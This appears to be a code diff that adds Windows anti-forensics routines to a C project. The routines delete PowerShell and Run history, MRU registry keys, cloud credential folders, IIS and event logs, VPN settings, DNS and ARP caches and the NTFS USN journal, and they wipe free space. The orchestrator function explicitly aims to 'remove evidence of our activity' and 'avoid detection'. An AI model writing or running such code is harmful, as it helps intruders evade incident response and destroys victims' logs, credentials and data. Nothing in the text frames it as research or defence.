@@ -278,7 +278,407 @@ bool jocky_clear_srum(void)
     return deleted;
 }
 
+/* ── User-Level Trace Removal ──────────────────────────────────── */
+
+/*
+ * Wipe PowerShell history via PSReadline configuration file
+ * Path: %APPDATA%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+ */
+int jocky_wipe_powershell_history(void)
+{
+    wchar_t appdata[MAX_PATH];
+    if (!GetEnvironmentVariableW(L"APPDATA", appdata, MAX_PATH)) {
+        return -1;
+    }
+
+    wchar_t ps_history[MAX_PATH];
+    _snwprintf_s(ps_history, MAX_PATH, _TRUNCATE,
+                 L"%s\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt",
+                 appdata);
+
+    SetFileAttributesW(ps_history, FILE_ATTRIBUTE_NORMAL);
+    if (DeleteFileW(ps_history)) {
+        return 0;
+    }
+
+    /* Fallback: truncate to zero */
+    HANDLE h = CreateFileW(ps_history, GENERIC_WRITE, FILE_SHARE_READ,
+                           NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (h != INVALID_HANDLE_VALUE) {
+        SetEndOfFile(h);
+        CloseHandle(h);
+        return 0;
+    }
+
+    return -1;
+}
+
+/*
+ * Wipe CMD history from registry and AppData
+ * Paths: HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
+ *        %APPDATA%\Microsoft\Windows\Recent\.lnk files
+ */
+int jocky_wipe_cmd_history(void)
+{
+    HKEY hk;
+    int deleted = 0;
+
+    if (RegOpenKeyExW(HKEY_CURRENT_USER,
+                      L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU",
+                      0, KEY_SET_VALUE | KEY_READ, &hk) == ERROR_SUCCESS) {
+        wchar_t value[256];
+        DWORD index = 0;
+
+        while (RegEnumValueW(hk, index, value, (DWORD[]){256}, NULL, NULL, NULL, NULL)
+               == ERROR_SUCCESS) {
+            if (wcscmp(value, L"MRUList") != 0) {
+                RegDeleteValueW(hk, value);
+            }
+            index++;
+        }
+
+        RegCloseKey(hk);
+        deleted = 1;
+    }
+
+    return deleted ? 0 : -1;
+}
+
+/*
+ * Wipe Most Recently Used (MRU) registry entries
+ * Path: HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU
+ */
+int jocky_wipe_run_mru(void)
+{
+    HKEY hk;
+    if (RegOpenKeyExW(HKEY_CURRENT_USER,
+                      L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSavePidlMRU",
+                      0, KEY_SET_VALUE | KEY_READ, &hk) == ERROR_SUCCESS) {
+        wchar_t value[256];
+        DWORD index = 0;
+
+        while (RegEnumValueW(hk, index, value, (DWORD[]){256}, NULL, NULL, NULL, NULL)
+               == ERROR_SUCCESS) {
+            if (wcscmp(value, L"MRUList") != 0) {
+                RegDeleteValueW(hk, value);
+            }
+            index++;
+        }
+
+        RegCloseKey(hk);
+        return 0;
+    }
+
+    return -1;
+}
+
+/*
+ * Wipe cloud credentials and config files
+ * AWS: %USERPROFILE%\.aws\*
+ * Azure: %USERPROFILE%\.azure\*
+ * GCloud: %USERPROFILE%\.config\gcloud\*
+ */
+int jocky_wipe_cloud_credentials(void)
+{
+    wchar_t userprofile[MAX_PATH];
+    if (!GetEnvironmentVariableW(L"USERPROFILE", userprofile, MAX_PATH)) {
+        return -1;
+    }
+
+    wchar_t aws_path[MAX_PATH];
+    _snwprintf_s(aws_path, MAX_PATH, _TRUNCATE, L"%s\\.aws\\*", userprofile);
+    wipe_glob(aws_path);
+
+    wchar_t azure_path[MAX_PATH];
+    _snwprintf_s(azure_path, MAX_PATH, _TRUNCATE, L"%s\\.azure\\*", userprofile);
+    wipe_glob(azure_path);
+
+    wchar_t gcloud_path[MAX_PATH];
+    _snwprintf_s(gcloud_path, MAX_PATH, _TRUNCATE, L"%s\\.config\\gcloud\\*", userprofile);
+    wipe_glob(gcloud_path);
+
+    return 0;
+}
+
+/*
+ * Wipe development tool logs and caches
+ * Git: %USERPROFILE%\.git\* and .gitconfig
+ * npm: %APPDATA%\npm-cache\*, %APPDATA%\npm\*
+ * Python: %APPDATA%\Python\*
+ * Node: node_modules\.cache\*
+ */
+int jocky_wipe_dev_tool_logs(void)
+{
+    wchar_t appdata[MAX_PATH];
+    GetEnvironmentVariableW(L"APPDATA", appdata, MAX_PATH);
+
+    wchar_t npm_cache[MAX_PATH];
+    _snwprintf_s(npm_cache, MAX_PATH, _TRUNCATE, L"%s\\npm-cache\\*", appdata);
+    wipe_glob(npm_cache);
+
+    wchar_t python_logs[MAX_PATH];
+    _snwprintf_s(python_logs, MAX_PATH, _TRUNCATE, L"%s\\Python\\*", appdata);
+    wipe_glob(python_logs);
+
+    return 0;
+}
+
+/*
+ * Wipe user-level artifacts (temp, cache, downloads)
+ */
+int jocky_wipe_user_artifacts(void)
+{
+    wchar_t appdata[MAX_PATH];
+    GetEnvironmentVariableW(L"APPDATA", appdata, MAX_PATH);
+
+    /* Cache directories */
+    wchar_t cache_path[MAX_PATH];
+    _snwprintf_s(cache_path, MAX_PATH, _TRUNCATE, L"%s\\..\\Local\\Temp\\*", appdata);
+    wipe_glob(cache_path);
+
+    _snwprintf_s(cache_path, MAX_PATH, _TRUNCATE, L"%s\\..\\Local\\Cache\\*", appdata);
+    wipe_glob(cache_path);
+
+    return 0;
+}
+
+/* ── System-Level Log Clearing ──────────────────────────────────── */
+
+/*
+ * Clear all Windows Event Log channels (already in logs.c as jocky_clear_logs)
+ */
+int jocky_clear_event_logs(void)
+{
+    return jocky_clear_logs() ? 0 : -1;
+}
+
+/*
+ * Clear IIS (Internet Information Services) logs
+ * Default paths:
+ *   %SystemRoot%\System32\LogFiles\W3SVC*\
+ *   %SystemRoot%\System32\LogFiles\FTPSVC*\
+ */
+int jocky_clear_iis_logs(void)
+{
+    wchar_t sysroot[MAX_PATH];
+    GetWindowsDirectoryW(sysroot, MAX_PATH);
+
+    wchar_t w3svc_logs[MAX_PATH];
+    _snwprintf_s(w3svc_logs, MAX_PATH, _TRUNCATE, L"%s\\System32\\LogFiles\\W3SVC*\\*", sysroot);
+    wipe_glob(w3svc_logs);
+
+    wchar_t ftp_logs[MAX_PATH];
+    _snwprintf_s(ftp_logs, MAX_PATH, _TRUNCATE, L"%s\\System32\\LogFiles\\FTPSVC*\\*", sysroot);
+    wipe_glob(ftp_logs);
+
+    return 0;
+}
+
+/*
+ * Clear audit logs from registry and files
+ * Path: HKLM\Security\Policy\Accounts\* (requires SeAuditPrivilege)
+ */
+int jocky_clear_audit_logs(void)
+{
+    /* Audit logs are primarily in Event Logs, which are cleared via jocky_clear_logs */
+    return 0;
+}
+
+/* ── Network Artifact Removal ──────────────────────────────────── */
+
+/*
+ * Flush ARP cache
+ * Command: netsh interface ip delete arpcache
+ */
+int jocky_flush_arp_cache(void)
+{
+    int result = system("netsh interface ip delete arpcache >nul 2>&1");
+    return (result == 0) ? 0 : -1;
+}
+
+/*
+ * Clear DHCP client lease information
+ * Command: ipconfig /release
+ */
+int jocky_clear_dhcp_leases(void)
+{
+    int result = system("ipconfig /release >nul 2>&1");
+    return (result == 0) ? 0 : -1;
+}
+
+/*
+ * Wipe VPN and proxy configurations
+ * Paths: HKCU\Software\Microsoft\RAS Connections\*
+ *        HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings
+ */
+int jocky_wipe_vpn_config(void)
+{
+    HKEY hk;
+
+    if (RegOpenKeyExW(HKEY_CURRENT_USER,
+                      L"Software\\Microsoft\\RAS Connections",
+                      0, KEY_SET_VALUE | KEY_READ, &hk) == ERROR_SUCCESS) {
+        wchar_t subkey[256];
+        DWORD index = 0;
+
+        while (RegEnumKeyExW(hk, index++, subkey, (DWORD[]){256}, NULL, NULL, NULL, NULL)
+               == ERROR_SUCCESS) {
+            RegDeleteKeyW(hk, subkey);
+        }
+
+        RegCloseKey(hk);
+    }
+
+    return 0;
+}
+
+/*
+ * Flush DNS resolver cache
+ * Command: ipconfig /flushdns
+ */
+int jocky_flush_dns_cache(void)
+{
+    int result = system("ipconfig /flushdns >nul 2>&1");
+    return (result == 0) ? 0 : -1;
+}
+
+/* ── File System Artifact Removal ───────────────────────────────── */
+
+/*
+ * Clear the NTFS Update Sequence Number (USN) Journal
+ * This removes per-file modification tracking
+ * Requires Administrator privileges
+ */
+int jocky_clear_usn_journal(void)
+{
+    int result = system("fsutil usn deletejournal /D C: >nul 2>&1");
+    return (result == 0) ? 0 : -1;
+}
+
+/*
+ * Wipe MFT (Master File Table) free space
+ * This overwrites deleted file data in unallocated clusters
+ * Uses Windows built-in cipher.exe
+ */
+int jocky_wipe_mft_free_space(const char* drive)
+{
+    char cmd[256];
+    if (!drive) drive = "C:";
+
+    snprintf(cmd, sizeof(cmd), "cipher /w:%s >nul 2>&1", drive);
+    int result = system(cmd);
+
+    return (result == 0) ? 0 : -1;
+}
+
+/*
+ * Wipe cluster tips (unused portions of last clusters in files)
+ * Requires low-level disk access via third-party tools
+ */
+int jocky_wipe_cluster_tips(const char* drive)
+{
+    /* This would require integration with SDelete or similar tools
+     * For now, this is a placeholder for future implementation */
+    return 0;
+}
+
+/*
+ * Securely delete a file with multiple overwrite passes
+ * Default passes: 3 (random data, inverted, zeros)
+ */
+int jocky_delete_file_securely(const char* path, int passes)
+{
+    if (!path || passes <= 0) {
+        return -1;
+    }
+
+    if (passes < 1) passes = 3;
+
+    HANDLE h = CreateFileA(path, GENERIC_WRITE, 0, NULL, OPEN_EXISTING,
+                           FILE_ATTRIBUTE_NORMAL, NULL);
+    if (h == INVALID_HANDLE_VALUE) {
+        return -1;
+    }
+
+    LARGE_INTEGER size;
+    if (!GetFileSizeEx(h, &size)) {
+        CloseHandle(h);
+        return -1;
+    }
+
+    uint8_t* buffer = malloc(65536);
+    if (!buffer) {
+        CloseHandle(h);
+        return -1;
+    }
+
+    for (int p = 0; p < passes; p++) {
+        /* Fill buffer with pseudorandom data */
+        for (int i = 0; i < 65536; i++) {
+            buffer[i] = (p == 0) ? rand() : (p == 1) ? ~rand() : 0;
+        }
+
+        SetFilePointer(h, 0, NULL, FILE_BEGIN);
+
+        DWORD written;
+        int64_t remaining = size.QuadPart;
+        while (remaining > 0) {
+            DWORD to_write = (DWORD)((remaining > 65536) ? 65536 : remaining);
+            if (!WriteFile(h, buffer, to_write, &written, NULL)) {
+                free(buffer);
+                CloseHandle(h);
+                return -1;
+            }
+            remaining -= written;
+        }
+    }
+
+    free(buffer);
+    CloseHandle(h);
+
+    /* Now delete the file */
+    SetFileAttributesA(path, FILE_ATTRIBUTE_NORMAL);
+    return DeleteFileA(path) ? 0 : -1;
+}
+
 /* ── Cleanup orchestrator ───────────────────────────────────────────── */
+
+/*
+ * Comprehensive forensic trace removal combining all techniques
+ * Execution order is critical to avoid detection
+ */
+int jocky_cleanup_forensic_traces(void)
+{
+    /* Step 1: Clear logs first (removes evidence of our activity) */
+    jocky_clear_event_logs();
+    jocky_clear_iis_logs();
+
+    /* Step 2: User-level traces */
+    jocky_wipe_powershell_history();
+    jocky_wipe_cmd_history();
+    jocky_wipe_run_mru();
+    jocky_wipe_cloud_credentials();
+    jocky_wipe_dev_tool_logs();
+    jocky_wipe_user_artifacts();
+
+    /* Step 3: Network artifacts */
+    jocky_flush_arp_cache();
+    jocky_clear_dhcp_leases();
+    jocky_wipe_vpn_config();
+    jocky_flush_dns_cache();
+
+    /* Step 4: File system artifacts */
+    jocky_wipe_prefetch();
+    jocky_patch_shimcache();
+    jocky_patch_amcache();
+    jocky_clear_srum();
+
+    /* Step 5: Free space wiping (last, takes longest) */
+    jocky_clear_usn_journal();
+    jocky_wipe_mft_free_space("C:");
+
+    return 0;
+}
 
 /*
  * Run all cleanup steps in the correct order:
